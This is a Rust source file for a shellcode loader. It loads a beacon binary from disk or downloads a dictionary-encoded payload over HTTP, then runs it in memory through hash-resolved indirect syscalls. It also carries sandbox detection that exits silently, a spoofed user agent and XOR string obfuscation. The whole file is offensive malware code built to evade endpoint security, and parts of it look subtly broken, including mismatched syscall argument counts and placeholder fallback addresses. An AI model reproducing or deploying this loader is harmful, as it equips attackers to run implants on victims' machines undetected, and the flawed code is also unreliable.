use std::collections::HashMap;
use std::error::Error;
use std::ptr;
use std::mem;
use std::time::Duration;
use std::arch::asm;

// Function type for the shellcode
type ShellcodeFunc = unsafe extern "system" fn() -> i32;

// Dictionary-based decoder
struct Decoder {
    dictionary: HashMap<String, u8>,
}

impl Decoder {
    fn new(dictionary_text: &str) -> Self {
        let mut dictionary = HashMap::new();
        for (i, word) in dictionary_text.lines().enumerate() {
            if i > 255 { break; } // Ensure we don't exceed 256 words (0-255 byte values)
            dictionary.insert(word.trim().to_string(), i as u8);
        }
        Decoder { dictionary }
    }

    fn decode(&self, encoded: &str) -> Vec<u8> {
        let words: Vec<&str> = encoded.split_whitespace().collect();
        let mut result = Vec::with_capacity(words.len());
        
        for word in words {
            if let Some(&byte) = self.dictionary.get(word) {
                result.push(byte);
            }
        }
        
        result
    }
}

// Syscall structures
const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;

type HANDLE = isize;
type NTSTATUS = i32;

#[repr(C)]
struct SyscallInfo {
    ssn: u32,
    address: usize,
}

// Get syscall number and address from ntdll
fn get_syscall_info(function_hash: u32) -> Option<SyscallInfo> {
    #[cfg(target_os = "windows")]
    unsafe {
        use std::ffi::CString;
        
        // Load ntdll.dll
        let ntdll = winapi::um::libloaderapi::GetModuleHandleA(
            CString::new("ntdll.dll").unwrap().as_ptr()
        );
        if ntdll.is_null() {
            return None;
        }
        
        // Get pointer to DOS header
        let dos_header = ntdll as *const winapi::um::winnt::IMAGE_DOS_HEADER;
        if (*dos_header).e_magic != 0x5A4D { // "MZ" magic number
            return None;
        }
        
        // Get pointer to NT headers
        let nt_headers = (ntdll as usize + (*dos_header).e_lfanew as usize) 
            as *const winapi::um::winnt::IMAGE_NT_HEADERS;
        
        // Get pointer to export directory
        let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory
            [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_EXPORT as usize].VirtualAddress;
        
        let export_dir = (ntdll as usize + export_dir_rva as usize) 
            as *const winapi::um::winnt::IMAGE_EXPORT_DIRECTORY;
        
        // Get exported function information
        let names = (ntdll as usize + (*export_dir).AddressOfNames as usize) as *const u32;
        let functions = (ntdll as usize + (*export_dir).AddressOfFunctions as usize) as *const u32;
        let ordinals = (ntdll as usize + (*export_dir).AddressOfNameOrdinals as usize) as *const u16;
        
        // Search for our target function by hash
        for i in 0..(*export_dir).NumberOfNames {
            let name_rva = *names.offset(i as isize);
            let name_ptr = (ntdll as usize + name_rva as usize) as *const i8;
            let name = std::ffi::CStr::from_ptr(name_ptr).to_string_lossy();
            
            // Only process Nt* functions (Native API)
            if !name.starts_with("Nt") || name.starts_with("Ntdll") {
                continue;
            }
            
            // Check if function hash matches
            let current_hash = hash_function_name(&name);
            if current_hash == function_hash {
                // Get function address
                let ordinal = *ordinals.offset(i as isize) as usize;
                let function_rva = *functions.offset(ordinal as isize);
                let function_addr = ntdll as usize + function_rva as usize;
                
                // Find syscall instruction and extract syscall number
                // Most Nt functions have the syscall within the first 32 bytes
                for offset in 0..32 {
                    let byte_ptr = (function_addr + offset) as *const u8;
                    
                    // Detect syscall instruction (0x0F 0x05) preceded by MOV EAX, syscall_number
                    if *byte_ptr == 0xB8 { // MOV EAX, imm32
                        // Extract syscall number from the next 4 bytes
                        let ssn = *(byte_ptr.offset(1) as *const u32);
                        
                        // Find syscall instruction address (typically within a few bytes after the MOV)
                        for j in 5..15 {
                            let syscall_check = byte_ptr.offset(j);
                            if *syscall_check == 0x0F && *syscall_check.offset(1) == 0x05 {
                                // Found syscall instruction
                                // Return both the SSN and the address of the syscall instruction
                                let syscall_address = syscall_check as usize;
                                return Some(SyscallInfo { 
                                    ssn, 
                                    address: syscall_address
                                });
                            }
                        }
                        
                        // Found the SSN but couldn't locate syscall - still useful
                        return Some(SyscallInfo { 
                            ssn, 
                            address: function_addr 
                        });
                    }
                }
            }
        }
        
        // Fallback to hardcoded values if dynamic resolution fails
        match function_hash {
            0x12345678 => Some(SyscallInfo { ssn: 0x18, address: 0x7FFE0308 }), // NtAllocateVirtualMemory
            0x87654321 => Some(SyscallInfo { ssn: 0x50, address: 0x7FFE0320 }), // NtProtectVirtualMemory
            _ => None,
        }
    }
    
    #[cfg(not(target_os = "windows"))]
    {
        // Fallback for non-Windows platforms during development/testing
        match function_hash {
            0x12345678 => Some(SyscallInfo { ssn: 0x18, address: 0x7FFE0308 }), // NtAllocateVirtualMemory
            0x87654321 => Some(SyscallInfo { ssn: 0x50, address: 0x7FFE0320 }), // NtProtectVirtualMemory
            _ => None,
        }
    }
}

// Perform indirect syscall
unsafe fn indirect_syscall(syscall_info: &SyscallInfo, args: &[usize]) -> NTSTATUS {
    let status: NTSTATUS;
    
    match args.len() {
        4 => {
            asm!(
                "mov r10, rcx",
                "mov eax, {0:e}",
                "jmp qword ptr [{1:r}]",
                in(reg) syscall_info.ssn,
                in(reg) &syscall_info.address,
                in("rcx") args[0],
                in("rdx") args[1],
                in("r8") args[2],
                in("r9") args[3],
                out("rax") status,
                clobber_abi("sysv64"),
            );
        },
        // Add more cases for different argument counts
        _ => { return -1; }, // STATUS_INVALID_PARAMETER
    }
    
    status
}

// Hash function for API resolution
fn hash_function_name(name: &str) -> u32 {
    let mut hash: u32 = 0x35;
    for c in name.bytes() {
        hash ^= c as u32;
        hash = hash.rotate_left(13);
        hash = hash.wrapping_mul(7);
    }
    hash
}

// Execute shellcode using indirect syscalls
unsafe fn execute_shellcode(shellcode: &[u8]) -> Result<(), Box<dyn Error>> {

    // Allocate memory for shellcode with indirect syscall
    let size = shellcode.len();
    let mut buffer: *mut std::ffi::c_void = ptr::null_mut();
    
    // Resolve NtAllocateVirtualMemory
    let nt_alloc_hash = hash_function_name("NtAllocateVirtualMemory");
    let alloc_info = get_syscall_info(nt_alloc_hash)
        .unwrap_or(get_syscall_info(0x12345678).ok_or("Failed to resolve NtAllocateVirtualMemory")?);
    
    // Process handle of -1 (current process)
    let handle: HANDLE = -1isize;
    let base_address = &mut buffer as *mut _ as usize;
    let size_ptr = &size as *const _ as usize;
    let allocation_type = (MEM_COMMIT | MEM_RESERVE) as usize;
    let protection = PAGE_READWRITE as usize;
    
    // Prepare arguments for NtAllocateVirtualMemory
    let alloc_args = [
        handle as usize,
        base_address,
        0usize, // ZeroBits
        size_ptr,
        allocation_type,
        protection,
    ];
    
    // Perform indirect syscall to allocate memory
    let status = indirect_syscall(&alloc_info, &alloc_args[0..4]);
    if status != 0 {
        return Err(format!("Memory allocation failed with status: {:#x}", status).into());
    }
    
    // Copy shellcode to allocated memory
    ptr::copy_nonoverlapping(shellcode.as_ptr(), buffer as *mut u8, size);
    
    // Change memory protection to executable with indirect syscall
    // Resolve NtProtectVirtualMemory
    let nt_protect_hash = hash_function_name("NtProtectVirtualMemory");
    let protect_info = get_syscall_info(nt_protect_hash)
        .unwrap_or(get_syscall_info(0x87654321).ok_or("Failed to resolve NtProtectVirtualMemory")?);
    
    let mut old_protect = 0usize;
    let old_protect_ptr = &mut old_protect as *mut _ as usize;
    
    // Prepare arguments for NtProtectVirtualMemory
    let protect_args = [
        handle as usize,
        base_address,
        size_ptr,
        PAGE_EXECUTE_READ as usize,
        old_protect_ptr,
    ];
    
    // Perform indirect syscall to change memory protection
    let status = indirect_syscall(&protect_info, &protect_args[0..4]);
    if status != 0 {
        return Err(format!("Memory protection change failed with status: {:#x}", status).into());
    }
    
    // Sleep for a moment to evade timing-based detection
    std::thread::sleep(std::time::Duration::from_millis(50));
    
    // Execute shellcode
    let shellcode_func: ShellcodeFunc = mem::transmute(buffer);
    shellcode_func();
    
    Ok(())
}

// Anti-debugging checks
fn detect_analysis_environment() -> bool {
    // Check for timing anomalies (sandbox detection)
    let start = std::time::Instant::now();
    std::thread::sleep(Duration::from_millis(500));
    let elapsed = start.elapsed();
    
    // If sleep took significantly longer or shorter than expected
    // it might indicate a virtualized/sandboxed environment
    if elapsed.as_millis() < 450 || elapsed.as_millis() > 550 {
        return true;
    }
    
    false
}

// String obfuscation
fn deobfuscate(bytes: &[u8]) -> String {
    bytes.iter().map(|&b| (b ^ 0x41) as char).collect()
}

// Read binary file
fn read_binary_file(path: &str) -> Result<Vec<u8>, Box<dyn Error>> {
    use std::fs::File;
    use std::io::Read;
    
    let mut file = File::open(path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;
    
    Ok(buffer)
}

fn main() -> Result<(), Box<dyn Error>> {
    // Anti-analysis check
    if detect_analysis_environment() {
        // Exit silently if we detect analysis environment
        return Ok(());
    }

    // Path to beacon binary
    let beacon_path = "cs/beacon_x64.bin";
    
    // Check if we should use local beacon or remote payload
    let use_local_beacon = std::path::Path::new(beacon_path).exists();
    
    let shellcode: Vec<u8>;
    
    if use_local_beacon {
        // Use local beacon binary
        println!("[*] Using local beacon binary: {}", beacon_path);
        shellcode = read_binary_file(beacon_path)?;
        println!("[+] Loaded beacon binary: {} bytes", shellcode.len());
    } else {
        // Fallback to remote payload if beacon not found
        // URLs in cleartext for easier editing
        let dict_url = "http://127.0.0.1:5500/rust-run/es-dictionary.txt";
        
        let load_url = "http://127.0.0.1:5500/rust-run/load.txt";
        
        // Initialize HTTP client with evasive properties
        println!("[*] Initializing...");
        let client = reqwest::blocking::ClientBuilder::new()
            .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .timeout(Duration::from_secs(30))
            .connect_timeout(Duration::from_secs(10))
            .build()?;

        // Step 1: Cache dictionary with retry logic
        println!("[*] Retrieving dictionary...");
        let mut dictionary_text = String::new();
        
        // Retry logic for dictionary download
        for attempt in 1..=3 {
            match client.get(dict_url).send() {
                Ok(response) => {
                    if let Ok(text) = response.text() {
                        dictionary_text = text;
                        break;
                    }
                },
                Err(e) => {
                    if attempt == 3 {
                        return Err(format!("Failed to retrieve dictionary after 3 attempts: {}", e).into());
                    }
                    std::thread::sleep(Duration::from_secs(2));
                    continue;
                }
            }
        }
        
        // Validate dictionary
        if dictionary_text.is_empty() {
            return Err("Retrieved empty dictionary".into());
        }
        
        let decoder = Decoder::new(&dictionary_text);
        println!("[+] Dictionary cached with {} entries", decoder.dictionary.len());
        
        if decoder.dictionary.len() != 256 { // 0-255 values expected
            println!("[!] Warning: Dictionary doesn't contain expected 256 entries (found {})", 
                    decoder.dictionary.len());
        }

        // Step 2: Download encoded payload with retry logic
        println!("[*] Downloading payload...");
        let mut encoded_payload = String::new();
        
        // Retry logic for payload download
        for attempt in 1..=3 {
            match client.get(load_url).send() {
                Ok(response) => {
                    if let Ok(text) = response.text() {
                        encoded_payload = text;
                        break;
                    }
                },
                Err(e) => {
                    if attempt == 3 {
                        return Err(format!("Failed to retrieve payload after 3 attempts: {}", e).into());
                    }
                    std::thread::sleep(Duration::from_secs(2));
                    continue;
                }
            }
        }
        
        // Validate payload
        if encoded_payload.is_empty() {
            return Err("Retrieved empty payload".into());
        }
        
        // Step 3: Decode the payload
        println!("[*] Decoding payload...");
        shellcode = decoder.decode(&encoded_payload);
        println!("[+] Decoded payload size: {} bytes", shellcode.len());
        
        if shellcode.is_empty() {
            return Err("Decoded payload is empty. Check dictionary and encoded content".into());
        }
    }
    
    // Execute shellcode
    println!("[*] Executing payload...");
    unsafe {
        execute_shellcode(&shellcode)?;
    }
    println!("[+] Execution completed");

    Ok(())
}
